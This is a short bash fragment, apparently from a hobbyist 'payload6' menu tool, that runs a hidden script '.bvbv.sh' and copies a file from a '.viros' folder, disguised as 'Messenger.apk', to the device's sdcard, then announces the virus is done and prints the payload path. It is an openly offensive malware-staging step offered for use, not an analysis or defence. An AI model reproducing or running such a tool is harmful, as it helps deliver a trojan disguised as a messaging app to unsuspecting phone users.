echo -e " $blue"
echo "                            [0]back"
read -p "          entar" vv
if [ "$vv" -eq "0"  ]; then
payload6.sh
else
cd $HOME/payload6
chmod +x .bvbv.sh
sh .bvbv.sh
cp $HOME/payload6/.viros/Messenger.apk /sdcard/payload6
echo -e "$green               end the vairos----->(Messenger) "
echo ""
echo "      Path of the pyload----->  sdcard/payload6/Messenger.apk"
fi
echo -e "$yellow"
read -p "                              ------->entar<------"
payload6.sh

